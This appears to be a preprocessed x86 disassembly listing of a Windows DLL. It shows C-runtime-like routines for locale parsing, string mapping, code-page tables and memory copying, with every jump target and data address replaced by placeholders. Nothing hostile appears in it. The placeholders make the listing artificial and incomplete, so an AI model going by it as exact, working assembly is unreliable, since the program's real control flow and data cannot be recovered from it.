push ebx
push eax
call sub_1002fcab
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
push [ ebp - 0xa8 ]
call sub_100232d0
pop ecx
pop ecx
test eax eax
je r-xdata
cmp edi esi
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10020451
add esp 0x14
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_10025486
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_10026940
add esp 0xc
mov eax [ ebp - 0xa0 ]
cmp eax esi
je r-xdata
xor eax eax
mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_1002776c
add esp 0xc
test eax eax
je r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_10026940
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
mov [ eax ] esi
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_10020451
add esp 0x14
jmp r-xdata
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_1002f63b
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10020451
add esp 0x14
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
cmp [ ebp - 0xa4 ] esi
je r-xdata
sub_100258a1
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
mov ebx ecx
call sub_10027e84
push [ ebp + 0x8 ]
mov edi eax
lea eax [ ebp - 0x198 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push ebx
add edi 0x1d0
call sub_10025670
add esp 0x18
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0x4
lea ebx [ eax + esi ]
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_100232d0
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_100200e0
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_10026ca5
pop ecx
pop ecx
mov [ ebp - 0x190 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
mov eax [ ebx + 0x48 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x1a4 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
add ecx 0x6
imul ecx ecx 0x6
mov [ ebp - 0x194 ] eax
mov eax [ eax ]
mov [ ebp - 0x1a8 ] eax
lea eax [ ecx + esi ]
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c4 ]
push eax
call sub_10026940
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x190 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_1002776c
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp - 0x190 ]
mov ecx [ ebp - 0x194 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_10026940
add esp 0xc
cmp [ ebp + 0x8 ] 0x2
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
mov eax [ ebp - 0x198 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x24 ]
mov ecx [ edi + 0x20 ]
mov [ ebp - 0x19c ] eax
mov eax edi
mov eax [ ebp + 0x8 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x198 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1bc ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1bc ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x1a4 ] rw-data
je r-xdata
mov eax [ ebp - 0x1a4 ]
push [ ebp - 0x190 ]
mov [ ebx + 0x48 ] eax
call sub_100207fd
mov eax [ ebp - 0x1a8 ]
pop ecx
mov ecx [ ebp - 0x194 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 ]
mov edx [ eax ]
mov [ edi ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x190 ]
add ecx 0x5
shl ecx 0x4
mov [ eax ] 0x1
mov [ ecx + esi ] eax
mov eax [ ebp + 0x8 ]
add eax 0x5
shl eax 0x4
lea edi [ eax + esi ]
push [ edi ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_10030056
add esp 0x20
test eax eax
je r-xdata
push [ edi ]
call sub_100207fd
push [ ebx + 0x54 ]
call sub_100207fd
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x188 ]
push eax
call sub_10020a5a
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi ] eax
sub_10025ba3
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp eax ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
call sub_100254f3
cmp [ ecx ] 0x4c
jne r-xdata
shl eax 0x4
mov eax [ eax + esi + 0x48 ]
jmp r-xdata
push eax
call sub_100258a1
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push ecx
call sub_10025670
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ ecx + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
lea edi [ esi + 0x48 ]
cmp [ ecx + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_100232d0
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi ecx
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
push ebx
lea ecx [ ebp - 0x88 ]
call sub_100258a1
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_10030098
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_100200e0
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_10020980
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_1002f63b
add esp 0x10
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
lea ecx [ ebp - 0x88 ]
mov [ ebp + edi - 0x88 ] 0x0
call sub_100258a1
pop ecx
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10020451
add esp 0x14
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_10030160
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_10025dbe
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x5
push esi
push edi
ja r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor edi edi
inc edi
push edi
push 0x8
call sub_10026cea
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
push edi
push 0xd8
call sub_10026cea
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_10026065
mov [ eax ] 0xc
push edi
push 0x220
call sub_10026cea
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
push esi
call sub_100207fd
mov eax [ esi ]
mov ecx rw-data
call sub_1002512e
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ esi ]
call sub_10025ba3
pop ecx
test eax eax
jne r-xdata
push [ esi ]
call sub_100207fd
push esi
call sub_100207fd
pop ecx
jmp r-xdata
push [ esi + 0x4 ]
mov eax [ esi ]
push [ eax + 0x4 ]
call sub_1002d028
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi ]
call sub_10025095
push [ esi ]
call sub_10024ebd
push esi
call sub_100207fd
add esp 0xc
jmp r-xdata
pop ecx
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ eax ] edi
push [ esi + 0x4 ]
call sub_100207fd
push [ esi ]
call sub_10025095
push [ esi ]
call sub_10024ebd
push esi
call sub_100207fd
add esp 0x10
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax esi
jmp r-xdata
sub_10025eb3
push 0x14
push r--data
call sub_10028b48
xor ebx ebx
mov [ ebp - 0x20 ] ebx
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_10027e84
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_10025192
or [ esi + 0x70 ] 0x10
mov [ ebp - 0x4 ] ebx
push 0x1
push 0xd8
call sub_10026cea
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x24 ] edi
cmp edi ebx
je r-xdata
call sub_10026065
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020579
add esp 0x14
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002601e
mov eax [ ebp - 0x20 ]
push 0xc
call sub_10028f4e
pop ecx
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi + 0x6c ]
mov eax edi
call sub_1002512e
mov [ ebp - 0x4 ] ebx
call sub_10025fe1
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx edi
call sub_10025ba3
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
call sub_10028b8d
retn
push edi
call sub_10025095
push edi
call sub_10024ebd
pop ecx
pop ecx
cmp [ ebp + 0xc ] ebx
je r-xdata
push 0xc
call sub_10028f4e
pop ecx
mov [ ebp - 0x4 ] 0x2
lea ebx [ esi + 0x6c ]
mov eax ebx
call sub_10025154
push edi
call sub_10025095
pop ecx
test [ esi + 0x70 ] 0x2
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_100232d0
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10025fed
jmp r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] 0x1
mov edi [ ebx ]
mov eax rw-data
call sub_10025154
push 0x18
mov eax [ rw-data ]
add eax 0xc
push eax
push rw-data
call sub_10026940
add esp 0xc
call sub_10025208
sub_10026023
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_1002608b
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10026078
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_10026023
pop ecx
mov esi eax
call sub_10026065
mov [ eax ] esi
pop esi
pop ebp
retn
sub_100260ae
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
lea edi [ esi + 0xc0 ]
mov eax [ edi ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ edi ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_10026ca5
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_10026cea
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_10026cea
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_10026cea
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_10026cea
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_1002acc4
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_100207fd
push [ ebp - 0x1c ]
call sub_100207fd
push [ ebp - 0x20 ]
call sub_100207fd
push [ ebp - 0x28 ]
call sub_100207fd
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_100207fd
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
cmp eax 0x1
mov [ ebp - 0x30 ] eax
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_10030056
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_100268cc
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_100268cc
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_10026940
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_10026940
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_10026940
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
inc eax
inc eax
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_100207fd
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_100207fd
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_100207fd
push [ esi + 0xc0 ]
call sub_100207fd
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
cmp ecx edx
mov [ ebp - 0x20 ] ecx
jg r-xdata
mov ecx [ ebp - 0x1c ]
inc ecx
inc ecx
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
inc ecx
inc ecx
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_10026507
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_100207fd
pop ecx
sub_10026527
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_100301a0
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10020040
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_100301e9
add esp 0x18
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_100207fd
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_100207fd
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_10026507
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx ebx
je r-xdata
push eax
call sub_10022f32
pop ecx
cmp eax ebx
je r-xdata
call sub_100303a0
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_100209e0
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_100301e9
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_10022f32
pop ecx
cmp eax ebx
je r-xdata
call sub_100303a0
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_10026507
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_10026507
pop ecx
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
push eax
call sub_10022f32
pop ecx
cmp eax ebx
je r-xdata
call sub_100303a0
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_100268cc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10026527
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10026940
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
